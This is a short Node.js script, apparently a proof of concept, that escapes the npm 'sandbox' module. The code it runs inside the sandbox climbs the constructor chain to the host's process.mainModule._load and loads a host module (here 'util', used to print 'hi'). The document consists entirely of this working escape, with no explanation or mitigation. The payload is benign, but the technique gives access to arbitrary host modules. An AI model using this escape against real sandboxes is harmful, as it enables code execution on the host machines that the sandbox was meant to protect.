var Sandbox = require("sandbox")
s = new Sandbox()
code = `new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("util").inspect("hi")`
s.run(code)
